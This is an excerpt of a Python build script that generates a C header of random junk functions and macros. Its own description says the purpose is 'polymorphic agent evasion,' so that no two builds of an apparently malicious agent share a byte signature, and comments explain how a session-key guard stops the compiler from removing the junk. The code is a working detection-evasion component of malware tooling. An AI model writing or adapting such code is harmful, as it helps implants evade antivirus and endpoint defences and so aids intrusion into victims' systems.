...
TYPES_ALL  = ['uint32_t', 'uint64_t']         # either width (used in tmpl_linear parameter)
...
def main():
    parser = argparse.ArgumentParser(
        description="Build-time junk-function generator for polymorphic agent evasion.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Generates poly_stubs.h with 6-14 randomly-shaped 'dead' junk functions\n"
            "(compiled via POLY_CALL_CHAIN but never called at runtime) and 3-5\n"
            "'live' idempotent junk macros (execute unconditionally, no side effects).\n"
            "Each invocation produces different random constants and different CFG\n"
            "shapes — two consecutive builds share no byte signature in .text.\n"
            "Called by the Makefile; can also be run standalone."
        ),
    )
    parser.add_argument(
        "output", nargs="?", default="src/poly_stubs.h", metavar="output.h",
        help="output C header path (default: src/poly_stubs.h)",
    )
    a = parser.parse_args()
    out = a.output
    ...
    # final binary.  It is inserted ONCE in main() before the main event loop.
    #
    # HOW THE GUARD WORKS:
    ...
    #     - Before ECDH: g_aid_hash = 0, POLY_DEAD_CONST != 0 (guaranteed by | 1)
    #     - After ECDH:  g_aid_hash is derived from the session key — probability
    #                    of accidental equality is 1 in 2^32 per session.
    #   But GCC cannot PROVE this at compile time (g_aid_hash is a non-const
    #   global), so it must emit a real comparison and conditional jump, and must
    #   emit real CALL instructions for all junk functions inside the guard.
    #
    ...
    #   until call N finishes, so the compiler cannot reorder or eliminate calls.
    chain_lines = [
        ...
        "    if ((_g) == POLY_DEAD_CONST) { \\",
        "        volatile uint64_t _pr = (uint64_t)(_g); \\",
    ]
    for fname in func_names:
        chain_lines.append(f"        _pr = {fname}(_pr); \\")
    chain_lines += [
        "        (void)_pr; \\",
        "    } \\",
        "} while(0)",
    ...
    lines.append("#endif /* POLY_STUBS_H */")
    ...
    print(f"[gen_poly_stubs] {N} dead-junk functions  templates={tnames}")
    print(f"[gen_poly_stubs] {M} live-junk macros     templates={live_tnames}")
